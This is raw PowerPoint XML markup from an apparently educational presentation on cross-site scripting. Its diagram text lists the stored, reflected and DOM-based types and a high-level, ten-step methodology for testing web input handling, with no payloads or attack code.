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257" r:id="rId2"/>
    <p:sldId id="334" r:id="rId3"/>
    <p:sldId id="335" r:id="rId4"/>
    <p:sldId id="337" r:id="rId5"/>
    <p:sldId id="338" r:id="rId6"/>
    <p:sldId id="339" r:id="rId7"/>
    <p:sldId id="340" r:id="rId8"/>
    <p:sldId id="445" r:id="rId9"/>
    <p:sldId id="359" r:id="rId10"/>
    <p:sldId id="361" r:id="rId11"/>
    <p:sldId id="342" r:id="rId12"/>
    <p:sldId id="343" r:id="rId13"/>
    <p:sldId id="426" r:id="rId14"/>
    <p:sldId id="344" r:id="rId15"/>
    <p:sldId id="427" r:id="rId16"/>
    <p:sldId id="345" r:id="rId17"/>
    <p:sldId id="354" r:id="rId18"/>
    <p:sldId id="355" r:id="rId19"/>
    <p:sldId id="428" r:id="rId20"/>
    <p:sldId id="409" r:id="rId21"/>
    <p:sldId id="411" r:id="rId22"/>
    <p:sldId id="429" r:id="rId23"/>
    <p:sldId id="430" r:id="rId24"/>
    <p:sldId id="431" r:id="rId25"/>
    <p:sldId id="432" r:id="rId26"/>
    <p:sldId id="433" r:id="rId27"/>
    <p:sldId id="434" r:id="rId28"/>
    <p:sldId id="435" r:id="rId29"/>
    <p:sldId id="436" r:id="rId30"/>
    <p:sldId id="437" r:id="rId31"/>
    <p:sldId id="438" r:id="rId32"/>
    <p:sldId id="439" r:id="rId33"/>
    <p:sldId id="440" r:id="rId34"/>
    <p:sldId id="441" r:id="rId35"/>
    <p:sldId id="442" r:id="rId36"/>
    <p:sldId id="443" r:id="rId37"/>
    <p:sldId id="44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CE-21CE033_CHHATRAVALA_JAY AMRISHBHAI" initials="CJ"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0176" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="66" d="100"/>
          <a:sy n="66" d="100"/>
        </p:scale>
        <p:origin x="668" y="-28"/>
      </p:cViewPr>
      <p:guideLst/>
    </p:cSldViewPr>
  </p:slideViewPr>
  <p:notesTextViewPr>
    <p:cViewPr>
      <p:scale>
        <a:sx n="1" d="1"/>
        <a:sy n="1" d="1"/>
      </p:scale>
      <p:origin x="0" y="0"/>
    </p:cViewPr>
  </p:notesTextViewPr>
  <p:notesViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="85" d="100"/>
          <a:sy n="85" d="100"/>
        </p:scale>
        <p:origin x="3876" y="4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BCEA47-ECD4-4AD1-850E-94F35BB17AC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E91BEF1-09BF-467E-AC86-E6441DE40418}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Stored</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CB05BD69-4CB5-40D2-94A4-97DE642C27E6}" type="parTrans" cxnId="{F33F282D-0450-47B8-9C93-0BEC76C0D329}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1215BB95-0F38-4B68-B09F-B585CBF874DA}" type="sibTrans" cxnId="{F33F282D-0450-47B8-9C93-0BEC76C0D329}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6D119D42-C170-489A-BE89-7AC90A5669E8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Reflected </a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5815D49D-5432-4D31-BEBE-3B953340E304}" type="parTrans" cxnId="{DECB7898-7940-4710-B73D-6E944EB10EEC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{ACF2D719-F666-4366-8892-AF8A8EE0C89A}" type="sibTrans" cxnId="{DECB7898-7940-4710-B73D-6E944EB10EEC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1E926E92-3E94-4CD8-A4FA-E51DD235B945}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" dirty="0"/>
            <a:t>DOM (Document Object Model )</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7C4C0E83-5529-4C4A-BAF2-B53750F2EC01}" type="parTrans" cxnId="{55FD92BA-1D26-43C5-9711-B58D07D5CB8C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{930C4FB8-1979-44AD-8129-44F393EED030}" type="sibTrans" cxnId="{55FD92BA-1D26-43C5-9711-B58D07D5CB8C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4FF51D31-8314-475A-A0A0-1ED1AD2CFCA4}" type="pres">
      <dgm:prSet presAssocID="{3BBCEA47-ECD4-4AD1-850E-94F35BB17AC1}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4FFFE1E2-9EF9-4602-87E7-7931A2922D5C}" type="pres">
      <dgm:prSet presAssocID="{FE91BEF1-09BF-467E-AC86-E6441DE40418}" presName="parentText" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{30AE0EF9-66DB-4721-A456-E007A12B8DF5}" type="pres">
      <dgm:prSet presAssocID="{1215BB95-0F38-4B68-B09F-B585CBF874DA}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0C3E0CD8-CF36-4DF2-A45F-D1AE7D1A4B50}" type="pres">
      <dgm:prSet presAssocID="{6D119D42-C170-489A-BE89-7AC90A5669E8}" presName="parentText" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{48276BE8-2820-4BBB-95DB-944E9A3F6C77}" type="pres">
      <dgm:prSet presAssocID="{ACF2D719-F666-4366-8892-AF8A8EE0C89A}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5D954F5B-741A-4436-B154-FB9EE923B2FE}" type="pres">
      <dgm:prSet presAssocID="{1E926E92-3E94-4CD8-A4FA-E51DD235B945}" presName="parentText" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
  </dgm:ptLst>
  <dgm:cxnLst>
    <dgm:cxn modelId="{F33F282D-0450-47B8-9C93-0BEC76C0D329}" srcId="{3BBCEA47-ECD4-4AD1-850E-94F35BB17AC1}" destId="{FE91BEF1-09BF-467E-AC86-E6441DE40418}" srcOrd="0" destOrd="0" parTransId="{CB05BD69-4CB5-40D2-94A4-97DE642C27E6}" sibTransId="{1215BB95-0F38-4B68-B09F-B585CBF874DA}"/>
    <dgm:cxn modelId="{9BF59F3F-2EB0-4CBB-A317-635E8E159476}" type="presOf" srcId="{6D119D42-C170-489A-BE89-7AC90A5669E8}" destId="{0C3E0CD8-CF36-4DF2-A45F-D1AE7D1A4B50}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{30927F6B-31C7-4E0D-BE76-742AF83C4629}" type="presOf" srcId="{1E926E92-3E94-4CD8-A4FA-E51DD235B945}" destId="{5D954F5B-741A-4436-B154-FB9EE923B2FE}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D5CBCB7A-921A-4121-A127-66FC0C26BE2C}" type="presOf" srcId="{3BBCEA47-ECD4-4AD1-850E-94F35BB17AC1}" destId="{4FF51D31-8314-475A-A0A0-1ED1AD2CFCA4}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{DECB7898-7940-4710-B73D-6E944EB10EEC}" srcId="{3BBCEA47-ECD4-4AD1-850E-94F35BB17AC1}" destId="{6D119D42-C170-489A-BE89-7AC90A5669E8}" srcOrd="1" destOrd="0" parTransId="{5815D49D-5432-4D31-BEBE-3B953340E304}" sibTransId="{ACF2D719-F666-4366-8892-AF8A8EE0C89A}"/>
    <dgm:cxn modelId="{55FD92BA-1D26-43C5-9711-B58D07D5CB8C}" srcId="{3BBCEA47-ECD4-4AD1-850E-94F35BB17AC1}" destId="{1E926E92-3E94-4CD8-A4FA-E51DD235B945}" srcOrd="2" destOrd="0" parTransId="{7C4C0E83-5529-4C4A-BAF2-B53750F2EC01}" sibTransId="{930C4FB8-1979-44AD-8129-44F393EED030}"/>
    <dgm:cxn modelId="{46911AEA-01FC-4549-BA51-5B0D5599F483}" type="presOf" srcId="{FE91BEF1-09BF-467E-AC86-E6441DE40418}" destId="{4FFFE1E2-9EF9-4602-87E7-7931A2922D5C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{D6174D98-7805-434B-AA53-BA4DF696C596}" type="presParOf" srcId="{4FF51D31-8314-475A-A0A0-1ED1AD2CFCA4}" destId="{4FFFE1E2-9EF9-4602-87E7-7931A2922D5C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{58B8EC95-22A2-40C4-B632-A05A9DC485CE}" type="presParOf" srcId="{4FF51D31-8314-475A-A0A0-1ED1AD2CFCA4}" destId="{30AE0EF9-66DB-4721-A456-E007A12B8DF5}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{05DB18F2-48DF-4D49-B093-5B3141F1CF57}" type="presParOf" srcId="{4FF51D31-8314-475A-A0A0-1ED1AD2CFCA4}" destId="{0C3E0CD8-CF36-4DF2-A45F-D1AE7D1A4B50}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{B6F8DC02-37DA-4935-9364-75081BF97872}" type="presParOf" srcId="{4FF51D31-8314-475A-A0A0-1ED1AD2CFCA4}" destId="{48276BE8-2820-4BBB-95DB-944E9A3F6C77}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2A797FE1-9FB3-4B60-8454-0341C02BF652}" type="presParOf" srcId="{4FF51D31-8314-475A-A0A0-1ED1AD2CFCA4}" destId="{5D954F5B-741A-4436-B154-FB9EE923B2F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960C35-3AD1-407E-BF5E-F8F1C1DBD28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42553F7-6672-4E4F-B269-10B321EE36E3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" dirty="0"/>
            <a:t>Find input points</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4804E1DA-4D8A-4E3C-A6E8-8869C5770FDF}" type="parTrans" cxnId="{BCFB7C9A-4E14-4F2C-981D-3F376F9B039B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7ABAF9AA-8EF9-4B3A-849D-4C511E0FA728}" type="sibTrans" cxnId="{BCFB7C9A-4E14-4F2C-981D-3F376F9B039B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EF159B89-3E80-405F-9BE4-DD6FA0EEACE6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Trace where input appears</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FE41E456-0693-44A9-B9A5-1676B426E885}" type="parTrans" cxnId="{869CA67C-BB93-43D5-88CB-B2EC4C04A29D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8B2AF12D-08A0-4888-8C07-804EC4D83E01}" type="sibTrans" cxnId="{869CA67C-BB93-43D5-88CB-B2EC4C04A29D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EB962BD7-7C90-4278-9315-DB6D6EA46FCF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Identify rendering context</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B138907A-710E-4797-A5CC-416959A7A531}" type="parTrans" cxnId="{A4B9F838-BCC2-4E97-B731-00F071147305}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2608B0CD-1C5C-4816-9A40-CBA2E1CEC775}" type="sibTrans" cxnId="{A4B9F838-BCC2-4E97-B731-00F071147305}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5E474BD1-00F5-4107-9AD7-F07355C26714}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Determine whether input is encoded</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D2CF6A7D-CE87-40E3-AD86-7F58D6B6ED46}" type="parTrans" cxnId="{CCC72D5D-B17C-49E5-936C-D3CDFC35DC61}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C92E055D-2189-49F2-AAD5-B49E34DF144E}" type="sibTrans" cxnId="{CCC72D5D-B17C-49E5-936C-D3CDFC35DC61}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5E5A0AD2-3A2B-4CF0-BC0A-34D9D0A640A9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Analyze server-side reflection</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F03F3FE0-E8A7-46FE-A36B-5909D6437750}" type="parTrans" cxnId="{2DCA2BEE-29CD-4EC8-B8D9-45EAC57D4EF7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F3E8AD44-1F46-47C7-ACB2-E1B06990FA5B}" type="sibTrans" cxnId="{2DCA2BEE-29CD-4EC8-B8D9-45EAC57D4EF7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{257DCFAE-DC0D-441C-9BD4-0F65F99D1B2B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" dirty="0"/>
            <a:t>Analyze client-side JavaScript</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9C1CD7C1-A276-4112-A98D-DB9420C13C61}" type="parTrans" cxnId="{91FCFB33-5D44-49B1-A790-3FF9E4E9237B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{B4CFC695-5C08-4752-BBBD-E0D256547D91}" type="sibTrans" cxnId="{91FCFB33-5D44-49B1-A790-3FF9E4E9237B}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D7002E52-62B8-455A-80D0-159094BF787E}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Trace source-to-sink flows</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D140D6ED-B110-4252-93D4-B597FFA24D84}" type="parTrans" cxnId="{8E272B6C-F8EE-45DD-AB65-B0DE62C87A1A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0B39518E-1839-4824-9D3E-02A0CCEAB400}" type="sibTrans" cxnId="{8E272B6C-F8EE-45DD-AB65-B0DE62C87A1A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7A22F409-EDC5-4F70-AFA9-A7D133497E26}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US"/>
            <a:t>Verify security controls</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0DC7A0A4-0D6E-49AB-88BF-221D368F1635}" type="parTrans" cxnId="{A23FD9C4-C3E0-436F-884C-15E93788045A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{62FFC00F-6C83-46C6-ADF7-8FCFCFB6AC89}" type="sibTrans" cxnId="{A23FD9C4-C3E0-436F-884C-15E93788045A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6A88A106-6E32-4E6A-AA56-C380E9D821AE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" dirty="0"/>
            <a:t>Assess exploitability</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{10BF150A-B841-4BD2-B7E7-2AC3D460C96C}" type="parTrans" cxnId="{B7A06E8A-ED37-4348-A10E-46EBE32E3D88}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1905847F-224E-4678-A366-030F750F8E6C}" type="sibTrans" cxnId="{B7A06E8A-ED37-4348-A10E-46EBE32E3D88}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{05BCCE9E-9CDE-405D-81A9-6B5B4A27F6C0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-US" dirty="0"/>
            <a:t>Document findings</a:t>
          </a:r>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{224C19EB-BBCD-4177-A22D-6EEA0A8CEE1D}" type="parTrans" cxnId="{1364209E-EC2E-4EC0-B815-08CE6DBA6574}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D34CD832-9ECA-4935-88C9-95AEAC008DDC}" type="sibTrans" cxnId="{1364209E-EC2E-4EC0-B815-08CE6DBA6574}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0E9A817A-AB86-4A10-866E-867C3E127A9E}" type="pres">
      <dgm:prSet presAssocID="{C3960C35-3AD1-407E-BF5E-F8F1C1DBD28A}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0AA2CB1B-3EE6-45D2-8E17-A3A7FFBAC186}" type="pres">
      <dgm:prSet presAssocID="{142553F7-6672-4E4F-B269-10B321EE36E3}" presName="parentText" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C306A941-D7DF-4B60-A0BC-4BA15EEA0EAD}" type="pres">
      <dgm:prSet presAssocID="{7ABAF9AA-8EF9-4B3A-849D-4C511E0FA728}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{0C2A20BB-3874-411B-B4EF-F9893CC7434E}" type="pres">
      <dgm:prSet presAssocID="{EF159B89-3E80-405F-9BE4-DD6FA0EEACE6}" presName="parentText" presStyleLbl="node1" presStyleIdx="1" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{633175FB-7E2B-4304-81AC-FD5A97251A55}" type="pres">
      <dgm:prSet presAssocID="{8B2AF12D-08A0-4888-8C07-804EC4D83E01}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D91CAFD1-68F7-4892-AB56-2BB8FB647821}" type="pres">
      <dgm:prSet presAssocID="{EB962BD7-7C90-4278-9315-DB6D6EA46FCF}" presName="parentText" presStyleLbl="node1" presStyleIdx="2" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{FA251A8A-4867-4AED-BD0A-2B16066BE68D}" type="pres">
      <dgm:prSet presAssocID="{2608B0CD-1C5C-4816-9A40-CBA2E1CEC775}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1D90FA77-F9D6-4697-9F5F-EA1F3274E421}" type="pres">
      <dgm:prSet presAssocID="{5E474BD1-00F5-4107-9AD7-F07355C26714}" presName="parentText" presStyleLbl="node1" presStyleIdx="3" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{13E41132-C8EB-4799-917B-76A4DA55091C}" type="pres">
      <dgm:prSet presAssocID="{C92E055D-2189-49F2-AAD5-B49E34DF144E}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D627ABE4-F16C-4946-B6DE-391526BA1262}" type="pres">
      <dgm:prSet presAssocID="{5E5A0AD2-3A2B-4CF0-BC0A-34D9D0A640A9}" presName="parentText" presStyleLbl="node1" presStyleIdx="4" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{E4E4897F-2F68-413C-9231-17B8C1E758BF}" type="pres">
      <dgm:prSet presAssocID="{F3E8AD44-1F46-47C7-ACB2-E1B06990FA5B}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{67B8B47A-7B33-4348-A82F-F7A62F7BED26}" type="pres">
      <dgm:prSet presAssocID="{257DCFAE-DC0D-441C-9BD4-0F65F99D1B2B}" presName="parentText" presStyleLbl="node1" presStyleIdx="5" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{48D2D1A6-2C41-4066-AB08-75031F74A0B3}" type="pres">
      <dgm:prSet presAssocID="{B4CFC695-5C08-4752-BBBD-E0D256547D91}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7C94F1C1-B85D-4F6D-8FFF-1A2CD078EF32}" type="pres">
      <dgm:prSet presAssocID="{D7002E52-62B8-455A-80D0-159094BF787E}" presName="parentText" presStyleLbl="node1" presStyleIdx="6" presStyleCnt="10">
        <dgm:presLayoutVars>
          <dgm:chMax val="0"/>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D698589F-4BBC-48E1-BCE0-F4E2DBC60223}" type="pres">
      <dgm:prSet presAssocID="{0B39518E-1839-4824-9D3E-02A0CCEAB400}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F22E466F-F781-4DA8-82A8-4FB6729971CF}" type="pres">
      <dgm:prSet presAssocID="{7A22F409-EDC5-4F70-AFA9-A7D133497E26}" presName="parentText" presStyleLbl="node1" presStyleIdx="7" presStyleCnt="10">
